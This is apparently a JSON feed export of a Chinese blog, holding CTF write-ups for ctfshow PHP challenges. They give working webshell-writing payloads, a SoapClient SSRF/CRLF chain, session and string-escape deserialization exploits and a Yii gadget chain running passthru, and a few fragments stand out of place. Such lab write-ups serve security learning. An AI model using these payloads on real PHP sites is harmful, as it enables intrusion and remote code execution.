            "content_html": "<h1 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h1><h2 id=\"没大没小的串串\"><a href=\"#没大没小的串串\" class=\"headerlink\" title=\"没大没小的串串\"></a>没大没小的串串</h2><p>爆破即可</p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"web-签到\"><a href=\"#web-签到\" class=\"headerlink\" title=\"web 签到\"></a>web 签到</h2><pre><code class=\"php\">&lt;?php\n\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-03-19 12:10:55\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-03-19 13:27:18\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$file = $_POST['file'];\n\nif(isset($file)){\n    if(strrev($file)==$file){\n        include $file;\n    }\n\n}\n</code></pre>\n<p>主要是字符串的反转 可利用data伪协议，<code>?&gt;</code>后可加任意字符，故payload</p>\n<pre><code class=\"raw\">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(\"cat /f1agaaa\");\n</code></pre>\n<h2 id=\"easyPHP\"><a href=\"#easyPHP\" class=\"headerlink\" title=\"easyPHP\"></a>easyPHP</h2><pre><code class=\"php\">&lt;?php\n\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2022-03-19 12:10:55\n# @Last Modified by:   h1xa\n# @Last Modified time: 2022-03-19 13:27:18\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n\n$cmd = $_POST['cmd'];\n$param = $_POST['param'];\n\nif(isset($cmd) &amp;&amp; isset($param)){\n    $cmd=escapeshellcmd(substr($cmd,0,3)).\" \".escapeshellarg($param).\" \".__FILE__;\n    shell_exec($cmd);\n}\n</code></pre>\n<pre><code class=\"raw\">sed 全称是：Stream EDitor\n调用 sed 命令有两种形式：\nsed [options] 'command' file (s)\nsed [options] -f scriptfile file (s)\na\\ 在当前行后面加入一行文本。\nb label 分支到脚本中带有标记的地方，如果分支不存在则分支到脚本的末尾。\nc\\ 用新的文本改变本行的文本。\nd 从模板块（Pattern space）位置删除行。\nD 删除模板块的第一行。\ni\\ 在当前行上面插入文本。\nh 拷贝模板块的内容到内存中的缓冲区。\nH 追加模板块的内容到内存中的缓冲区\ng 获得内存缓冲区的内容，并替代当前模板块中的文本。\nG 获得内存缓冲区的内容，并追加到当前模板块文本的后面。\nl 列表不能打印字符的清单。\nn 读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。\nN 追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。\np 打印模板块的行。\nP（大写）打印模板块的第一行。\nq 退出 Sed。\nr file 从 file 中读行。\nt labelif 分支，从最后一行开始，条件一旦满足或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nT label 错误分支，从最后一行开始，一旦发生错误或者 T，t 命令，将导致分支到带有标号的命令处，或者到脚本的末尾。\nw file 写并追加模板块到 file 末尾。\nW file 写并追加模板块的第一行到 file 末尾。\n！表示后面的命令对所有没有被选定的行发生作用。\ns/re/string 用 string 替换正则表达式 re。\n= 打印当前行号码。\n# 把注释扩展到下一个换行符以前。\n以下的是替换标记 g 表示行内全面替换。\np 表示打印行。\nw 表示把行写入一个文件。\nx 表示互换模板块中的文本和缓冲区中的文本。\ny 表示把一个字符翻译为另外的字符（但是不用于正则表达式）\n选项编辑 播报\n-e command,--expression=command 允许多台编辑。\n-h,--help 打印帮助，并显示 bug 列表的地址。\n-n,--quiet,--silent 取消默认输出。\n-f,--filer=script-file 引导 sed 脚本文件名。\n-V,--version 打印版本和版权信息。\n元字符集编辑 播报\n^ 锚定行的开始如：/^sed / 匹配所有以 sed 开头的行。\n$ 锚定行的结束 如：/sed$/ 匹配所有以 sed 结尾的行。\n. 匹配一个非换行符的字符 如：/s.d/ 匹配 s 后接一个任意字符，然后是 d。\n* 匹配零或多个字符 如：/*sed / 匹配所有模板是一个或多个空格后紧跟 sed 的行。\n[] 匹配一个指定范围内的字符，如 /[Ss] ed / 匹配 sed 和 Sed。\n[^] 匹配一个不在指定范围内的字符，如：/[^A-RT-Z] ed / 匹配不包含 A-R 和 T-Z 的一个字母开头，紧跟 ed 的行。\n\\(..\\）保存匹配的字符，如 s/\\(love\\) able/\\1rs，loveable 被替换成 lovers。\n&amp;；保存搜索字符用来替换其他字符，如 s/love/**&amp;**/，love 这成 **love**。\n\\&lt;；锚定单词的开始，如：/\\&lt;love / 匹配包含以 love 开头的单词的行。\n\\&gt;；锚定单词的结束，如 /love\\&gt;/ 匹配包含以 love 结尾的单词的行。\nx\\{m\\} 重复字符 x，m 次，如：/0\\{5\\}/ 匹配包含 5 个 o 的行。\nx\\{m,\\} 重复字符 x，至少 m 次，如：/o\\{5,\\}/ 匹配至少有 5 个 o 的行。\nx\\{m,n\\} 重复字符 x，至少 m 次，不多于 n 次，如：/o\\{5,10\\}/ 匹配 5--10 个 o 的行。\n</code></pre>\n<p>使用sed命令</p>\n<pre><code class=\"raw\">cmd=sed&amp;param=/php\\|POST\\|exec/!dw1.php\n</code></pre>\n<p>其意义为，sed命令，param的<code>/php\\|POST\\|exec/</code>为正则匹配表达式，用于匹配符合条件的行，<code>!</code>表示后面的命令对所有没有被选定的行发生作用，即后面的<code>d</code>删除行命令对所以未能匹配的行删除，<code>w</code>即把行写入文件</p>\n<p>执行后1.php的内容如下</p>\n<pre><code class=\"php\">&lt;?php\n$cmd = $_POST['cmd'];\n$param = $_POST['param'];\n    shell_exec($cmd);\n</code></pre>\n<p>之后切到1.php，输入payload</p>\n<pre><code class=\"bash\">cmd=echo \"&lt;?php eval(\\$_POST[1]);?&gt;\"&gt;2.php\n</code></pre>\n<p>这里在美元符号<code>$</code>前加上<code>\\</code>的原因为，在双引号下，<code>$_POST</code>会被当做为一个已经定义过的变量，并做替换，若没有<code>\\</code>，那么写入文件中的内容为</p>\n<pre><code class=\"php\">&lt;?php eval([1]);?&gt;\n</code></pre>\n<p>因此需要使得<code>$_POST</code>不作为变量名，这里有两种方案</p>\n<ol>\n<li><p>双引号改为单引号，在 shell 命令中，单引号中的变量是无效的</p>\n</li>\n<li><p>双引号包裹，在<code>$</code>前加上转移符号<code>\\</code></p>\n</li>\n</ol>\n<p>再切换到2.php, 之后就正常rce</p>\n<h2 id=\"姻缘测试\"><a href=\"#姻缘测试\" class=\"headerlink\" title=\"姻缘测试\"></a>姻缘测试</h2><p>SSTI 注入</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/d3333ead/",
            "url": "http://dpm12345.cn/posts/d3333ead/",
            "title": "反序列化",
            "date_published": "2022-10-04T14:16:40.000Z",
            "content_html": "<h1 id=\"web-258\"><a href=\"#web-258\" class=\"headerlink\" title=\"web 258\"></a>web 258</h1><p>相比于上一题多了正则匹配：<code>if(!preg_match('/[oc]:\\d+:/i', $_COOKIE['user']))</code></p>\n<p>由构造的序列化字符串，只需将<code>O:</code>改为<code>O:+</code>即可</p>\n<h1 id=\"web-259\"><a href=\"#web-259\" class=\"headerlink\" title=\"web 259\"></a>web 259</h1><p>这个题利用的是php原生类SoapClient<br>该类的构造函数如下：</p>\n<p><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></p>\n<p>flag.php</p>\n<pre><code class=\"php\">$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\n\nif($ip!=='127.0.0.1'){\n    die('error');\n}else{\n    $token = $_POST['token'];\n    if($token=='ctfshow'){\n        file_put_contents('flag.txt',$flag);\n    }\n}\n</code></pre>\n<p>当然这是个不完整的源码，应该还有一条判断真实ip的也就是</p>\n<pre><code class=\"php\">if($_SERVER['REMOTE_ADDR']==='127.0.0.1'){\nxxxxxx;\n}\n</code></pre>\n<p>所以首先得利用<code>ssrf</code>访问<code>flag.php</code>接着构造post数据<code>token=ctfshow</code>和请求头<code>X-Forwarded-For</code>就能把flag写到flag.txt中了。</p>\n<p>那么ssrf漏洞在哪呢，这就得用到我们前面提到的SoapClient类了。这个类中有个<code>__call</code>魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。</p>\n<p>另外用到的一个文章识点就是CRLF</p>\n<p>大概如下：</p>\n<p>在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码</p>\n<p>就比如跳转网站，一般其跳转包为</p>\n<pre><code class=\"html\">HTTP/1.1 302 Moved Temporarily \nDate: Fri, 27 Jun 2014 17:52:17 GMT \nContent-Type: text/html \nContent-Length: 154 \nConnection: close \nLocation: http://xxxx\n</code></pre>\n<p>如果我们将<code>http://xxxx</code>修改为<code>http://xxxx%0axxxx</code></p>\n<p>那么显然<code>Location</code>段会变为</p>\n<pre><code class=\"html\">Location: http://xxxx\nxxxx\n</code></pre>\n<p>这样我们就可以以此来修改跳转包，比如<code>Set-cookie</code>，从而使得进入跳转网站自带cookie</p>\n<p>同理，如果我们将<code>%0a</code>修改为<code>%0d%0a%0d%0a</code>，即两个CRLF(换行)</p>\n<p>那么<code>xxxx</code>会进入HTTP Body，即会显示，如果为<code>&lt;img src=1 onerror=alert(/xss/)&gt;</code>那么会显示一张图片，并在错误时进行弹窗</p>\n<p>但由于浏览器的XSS Filter，同时需要注入<code>X-XSS-Protection:0</code>，使得<code>alert</code>正常执行</p>\n<p>由此，我们利用SoapClient进行请求包的构造</p>\n<p>大致结构为</p>\n<pre><code class=\"html\">Content-Type: text/html \nContent-Length: 154 \nLocation: http://127.0.0.1/flag\nX-Forwarded-For:127.0.0.1\n\ntoken=ctfshow\n</code></pre>\n<p>所以payload</p>\n<pre><code class=\"php\">&lt;?php\n\n$url = \"http://127.0.0.1/flag.php\";\n$post = \"token=ctfshow\";\n$a = new SoapClient(null,array('location' =&gt; $url,'user_agent'=&gt;'xx^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded ^^Content-Length:'.(string)strlen($post).'^^^^'.$post,'uri'=&gt;'ssrf'));\n\necho urlencode(str_replace('^^',\"\\r\\n\",serialize($a)));\n</code></pre>\n<h1 id=\"web-260\"><a href=\"#web-260\" class=\"headerlink\" title=\"web 260\"></a>web 260</h1><pre><code class=\"php\">&lt;?php\n\nerror_reporting(0);\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nif(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\n    echo $flag;\n}\n</code></pre>\n<p>由源码知，只需反序列化后的字符串包含<code>ctfshow_i_love_36D</code>即可</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">&lt;?php\n\n$a = \"ctfshow_i_love_36D\";\n\necho urlencode(serialize($a));\n</code></pre>\n<h1 id=\"web-261\"><a href=\"#web-261\" class=\"headerlink\" title=\"web 261\"></a>web 261</h1><pre><code class=\"php\">&lt;?php\n\nhighlight_file(__FILE__);\n\nclass ctfshowvip{\n    public $username;\n    public $password;\n    public $code;\n\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function __wakeup(){\n        if($this-&gt;username!='' || $this-&gt;password!=''){\n            die('error');\n        }\n    }\n    public function __invoke(){\n        eval($this-&gt;code);\n    }\n\n    public function __sleep(){\n        $this-&gt;username='';\n        $this-&gt;password='';\n    }\n    public function __unserialize($data){\n        $this-&gt;username=$data['username'];\n        $this-&gt;password=$data['password'];\n        $this-&gt;code = $this-&gt;username.$this-&gt;password;\n    }\n    public function __destruct(){\n        if($this-&gt;code==0x36d){\n            file_put_contents($this-&gt;username, $this-&gt;password);\n        }\n    }\n}\n\nunserialize($_GET['vip']);\n</code></pre>\n<p>这题主要考察魔术方法的应用，</p>\n<p><code>__construct</code>为构造方法，</p>\n<p><code>__wakeup</code>准备对象资源，</p>\n<p><code>__invoke</code>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。 </p>\n<p><code>__sleep()</code>方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。 </p>\n<p><code>__unserialize</code>反序列化调用的方法</p>\n<p><code>__destruct</code>析构方法</p>\n<p>而如果类中同时定义了<code>__unserialize</code>和<code>__wakeup()</code>两个魔术方法，则只有<code>__unserialize()</code>方法会生效，<code>__wakeup()</code>方法会被忽略。 </p>\n<p>而在代码中，我们必然只能调用<code>__unserialize</code>和<code>__destruct</code>两个方法</p>\n<p>其中<code>__destruct</code>中由<code>file_put_contents</code>可以想到写一句话到文件里，其只需要<code>$this-&gt;code==0x36d</code>即可</p>\n<p>观察到为<code>==</code>即若等于，那么可以弄出<code>877.phpxxx==0x36d</code>，即控制了文件名，而内容为一句话，也可以控制</p>\n<p>观察到反序列化中均可控，那么可以使<code>$username='877.php'</code>,<code>$password='&lt;?php eval($_POST[1]);?&gt;'</code></p>\n<p>即可成功写入一句话，之后正常rce即可</p>\n<h1 id=\"web262\"><a href=\"#web262\" class=\"headerlink\" title=\"web262\"></a>web262</h1><p>源码</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-03 02:37:19\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-03 16:05:38\n# @message.php\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\n\nerror_reporting(0);\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n$f = $_GET['f'];\n$m = $_GET['m'];\n$t = $_GET['t'];\n\nif(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t)){\n    $msg = new message($f,$m,$t);\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\n    setcookie('msg',base64_encode($umsg));\n    echo 'Your message has been sent';\n}\n\nhighlight_file(__FILE__);\n\n</code></pre>\n<p>进入后发现并没有提供flag的地方，从头阅读源码，可以看到最上面注释有<code>message.php</code>，访问，得到</p>\n<p>message.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-03 15:13:03\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-03 15:17:17\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\nhighlight_file(__FILE__);\ninclude('flag.php');\n\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='user';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\nif(isset($_COOKIE['msg'])){\n    $msg = unserialize(base64_decode($_COOKIE['msg']));\n    if($msg-&gt;token=='admin'){\n        echo $flag;\n    }\n}\n</code></pre>\n<p>阅读代码，可知只需构造一个message类，token为<code>admin</code>即可，故exp.php</p>\n<pre><code class=\"php\">&lt;?php\n    class message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n\n\necho base64_encode(serialize(new message(\"1\",\"1\",\"1\")));\n</code></pre>\n<p>payload:<code>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIxIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></p>\n<p>设置cookie的msg为此值，得到flag</p>\n<h1 id=\"web-263\"><a href=\"#web-263\" class=\"headerlink\" title=\"web 263\"></a>web 263</h1><p>进入后是一个登陆界面，看似为sql注入，实则不是</p>\n<p>url输入<code>www.zip</code>可以下载题目的源码，可以看到如下文件结构</p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web263_1.jpg\"></p>\n<p>index.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-03 16:28:37\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-06 19:21:45\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n    error_reporting(0);\n    session_start();\n    //超过5次禁止登陆\n    if(isset($_SESSION['limit'])){\n        $_SESSION['limti']&gt;5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n        $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n    }else{\n         setcookie(\"limit\",base64_encode('1'));\n         $_SESSION['limit']= 1;\n    }\n    \n?&gt;\n</code></pre>\n<p>check.php</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-09-03 16:59:10\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-09-06 19:15:38\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nerror_reporting(0);\nrequire_once 'inc/inc.php';\n$GET = array(\"u\"=&gt;$_GET['u'],\"pass\"=&gt;$_GET['pass']);\n\n\nif($GET){\n\n    $data= $db-&gt;get('admin',\n    [\t'id',\n        'UserName0'\n    ],[\n        \"AND\"=&gt;[\n        \"UserName0[=]\"=&gt;$GET['u'],\n        \"PassWord1[=]\"=&gt;$GET['pass'] //密码必须为128位大小写字母+数字+特殊符号，防止爆破\n        ]\n    ]);\n    if($data['id']){\n        //登陆成功取消次数累计\n        $_SESSION['limit']= 0;\n        echo json_encode(array(\"success\",\"msg\"=&gt;\"欢迎您\".$data['UserName0']));\n    }else{\n        //登陆失败累计次数加1\n        $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);\n        echo json_encode(array(\"error\",\"msg\"=&gt;\"登陆失败\"));\n    }\n}\n</code></pre>\n<p>inc.php</p>\n<pre><code class=\"php\">&lt;?php\n    ...\n    class User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n    function setStatus($s){\n        $this-&gt;status=$s;\n    }\n    function __destruct(){\n        file_put_contents(\"log-\".$this-&gt;username, \"使用\".$this-&gt;password.\"登陆\".($this-&gt;status?\"成功\":\"失败\").\"----\".date_create()-&gt;format('Y-m-d H:i:s'));\n    }\n}\n...\n</code></pre>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p>可以看到在inc.php中，User的<code>__destruct</code>方法有<code>file_put_contents</code>方法，那么可以尝试一句话木马写文件，那么必须创建User对象</p>\n<p>查看源码流程,由于一开始进入，便会设置cookie及session，故略去if为false的情况</p>\n<p>index.php</p>\n<pre><code class=\"php\">$_SESSION['limti']&gt;5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\n$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\n</code></pre>\n<p>由于在index.php中无User类，故这里有用的只有设置session值</p>\n<p>故还需到check.php中，运行<code>$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);</code></p>\n<p>故设置好cookie的limit值后，前后各访问一次index.php和check.php，就能创建木马文件</p>\n<p>这里用到了<code>PHP的session反序列化漏洞</code>知识，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8xMTYyNDYuaHRt\">参考文章</span></p>\n<h2 id=\"php-session反序列化漏洞\"><a href=\"#php-session反序列化漏洞\" class=\"headerlink\" title=\"php session反序列化漏洞\"></a>php session反序列化漏洞</h2><h3 id=\"php-ini-与session有关的配置\"><a href=\"#php-ini-与session有关的配置\" class=\"headerlink\" title=\"php.ini 与session有关的配置\"></a>php.ini 与session有关的配置</h3><pre><code class=\"ini\">session.save_path=\"\"  --设置session的存储路径\nsession.save_handler=\"\" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)\nsession.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动\nsession.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php \n</code></pre>\n<p>其中<code>session.serialize_handler</code>共有三项值，各存储方式如下</p>\n<ul>\n<li><p>php_binary：键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p>\n<p>如：<code>names:6:\"spoock\";</code></p>\n</li>\n<li><p>php：键名+竖线+经过serialize()函数序列处理的值</p>\n<p>如：<code>name|s:6:\"spoock\";</code></p>\n</li>\n<li><p>php_serialize(php&gt;5.5.4)：经过serialize()函数序列化处理的值 </p>\n<p>如：<code>a:1:{s:4:\"name\";s:6:\"spoock\";}</code></p>\n</li>\n</ul>\n<p>当在<code>php</code>引擎设置下解析<code>a:1:{s:4:\"ryat\";s:30:\"|O:1:\"A\":1:{s:1:\"a\";s:2:\"xx\";}</code>时，由于在该设置下会以<code>|</code>为界，左边为key，右边为value，然后进行反序列化，最后得到</p>\n<p><code>a:1:{s:4:\"ryat\";s:30:\"</code> = A类对象</p>\n<p>从而得到一个A类对象</p>\n<p>因此，在这题，可以利用该原理获取一个User类对象</p>\n<p>exp.php</p>\n<pre><code class=\"php\">&lt;?php\nclass User{\n    public $username;\n    public $password;\n    public $status;\n    function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n}\n\necho urlencode(base64_encode(\"|\".serialize(new User(\"a.php\",'&lt;?php eval($_POST[1]);?&gt;'))));\n</code></pre>\n<p>[注：这里使用<code>urlencode</code>主要是为了防止影响结果，在做题时因<code>+</code>导致无法出结果]{.red}</p>\n<p>User对象已经构建，按照前面分析进行操作，生成的木马文件为<code>log-a.php</code></p>\n<p>访问</p>\n<p><img data-src=\"E:\\blog\\source\\素材\\ctfshow\\Web-vip\\web263_2.jpg\"></p>\n<p>一次post以下，得到flag</p>\n<pre><code class=\"raw\">1=system('ls');\n1=system('tac flag.php');\n</code></pre>\n<h1 id=\"web-264\"><a href=\"#web-264\" class=\"headerlink\" title=\"web 264\"></a>web 264</h1><p>相比较于web262，此时反序列化对象由index.php中的<code>$_SESSION['msg']</code>传递，因此不能像web262那样解题，而是涉及到字符串逃逸。</p>\n<p>这一题的字符串逃逸比较简单</p>\n<p>首先编写以下代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$a = new message(\"\",\"\",\"\");\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到<code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:0:\"\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>复制<code>\";s:5:\"token\";s:5:\"admin\";}</code>，作为构造的结尾</p>\n<p>再编写代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$a = new message(\"\",\"\",'\";s:5:\"token\";s:5:\"admin\";}');\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到<code>O:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:27:\"\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>可以看到，构造的结尾共有27个字符，而<code>fuck</code>替换为<code>loveU</code>增加了一个字符，故共需要27个<code>fuck</code></p>\n<p>编写如下代码</p>\n<pre><code class=\"php\">&lt;?php\nclass message{\n    public $from;\n    public $msg;\n    public $to;\n    public $token='admin';\n    public function __construct($f,$m,$t){\n        $this-&gt;from = $f;\n        $this-&gt;msg = $m;\n        $this-&gt;to = $t;\n    }\n}\n$s = str_repeat(\"fuck\",27);\necho $s.'\";s:5:\"token\";s:5:\"admin\";}',\"&lt;/br&gt;\";\n$a = new message(\"\",\"\",$s.'\";s:5:\"token\";s:5:\"admin\";}');\n$b = serialize($a);\necho str_replace(\"fuck\",\"loveU\",$b);\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}\nO:7:\"message\":4:{s:4:\"from\";s:0:\"\";s:3:\"msg\";s:0:\"\";s:2:\"to\";s:135:\"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU\";s:5:\"token\";s:5:\"admin\";}\";s:5:\"token\";s:5:\"admin\";}\n</code></pre>\n<p>经检查，<code>to</code>替换后135的末尾恰为最后一个<code>loveU</code>的结尾，故构造正确</p>\n<p>因此payload:<code>?f=&amp;m=&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}</code></p>\n<p>提交后，再访问message.php，由于需要设置cookie的msg值，故设置，刷新网页，得到flag</p>\n<h1 id=\"web-265\"><a href=\"#web-265\" class=\"headerlink\" title=\"web 265\"></a>web 265</h1><p>php按地址传参</p>\n<p>变量引用</p>\n<pre><code class=\"php\">&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nclass ctfshowAdmin{\n    public $token;\n    public $password;\n\n    public function __construct($t,$p){\n        $this-&gt;token=$t;\n        $this-&gt;password = &amp;$this-&gt;token;\n    }\n    public function login(){\n        return $this-&gt;token===$this-&gt;password;\n    }\n}\n\n$a = new ctfshowAdmin(\"\",'');\n\necho urlencode(serialize($a));\n</code></pre>\n<h1 id=\"web-266\"><a href=\"#web-266\" class=\"headerlink\" title=\"web 266\"></a>web 266</h1><p>PHP特性：函数名和类名不区分大小写，变量名区分。</p>\n<pre><code class=\"php\">&lt;?php\n\n/*\n# -*- coding: utf-8 -*-\n# @Author: h1xa\n# @Date:   2020-12-04 23:52:24\n# @Last Modified by:   h1xa\n# @Last Modified time: 2020-12-05 00:17:08\n# @email: h1xa@ctfer.com\n# @link: https://ctfer.com\n\n*/\n\nhighlight_file(__FILE__);\n\ninclude('flag.php');\n$cs = file_get_contents('php://input');\n\n\nclass ctfshow{\n    public $username='xxxxxx';\n    public $password='xxxxxx';\n    public function __construct($u,$p){\n        $this-&gt;username=$u;\n        $this-&gt;password=$p;\n    }\n    public function login(){\n        return $this-&gt;username===$this-&gt;password;\n    }\n    public function __toString(){\n        return $this-&gt;username;\n    }\n    public function __destruct(){\n        global $flag;\n        echo $flag;\n    }\n}\n$ctfshowo=@unserialize($cs);\nif(preg_match('/ctfshow/', $cs)){\n    throw new Exception(\"Error $ctfshowo\",1);\n}\n</code></pre>\n<p>payload:<code>O:7:\"Ctfshow\":0:{}</code></p>\n<p><img data-src=\"/../../../../post_images/ctfshow/Web-vip/web266.jpg\"></p>\n<h1 id=\"web-267\"><a href=\"#web-267\" class=\"headerlink\" title=\"web 267\"></a>web 267</h1><p>弱密码登入admin/admin</p>\n<p>查看源码知view-source</p>\n<p>在page下找到反序列换入口</p>\n<pre><code class=\"php\">unserialize(base64_decode($_GET['code']))\n</code></pre>\n<p>这里为<code>yii</code>的反序列化链</p>\n<p>只有<code>passthru</code>有回显</p>\n<p>最后的payload：</p>\n<pre><code class=\"raw\">?r=/backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19\n</code></pre>\n<p>脚本</p>\n<pre><code class=\"php\">&lt;?php\n\nnamespace yii\\rest{\n    class CreateAction{\n        public $checkAccess;\n        public $id;\n\n        public function __construct(){\n            $this-&gt;checkAccess = 'passthru';\n            $this-&gt;id = 'tac /flag';\n        }\n    }\n}\n\nnamespace Faker{\n    use yii\\rest\\CreateAction;\n\n    class Generator{\n        protected $formatters;\n\n        public function __construct(){\n            $this-&gt;formatters['close'] = [new CreateAction, 'run'];\n        }\n    }\n}\n\nnamespace yii\\db{\n    use Faker\\Generator;\n\n    class BatchQueryResult{\n        private $_dataReader;\n\n        public function __construct(){\n            $this-&gt;_dataReader = new Generator;\n        }\n    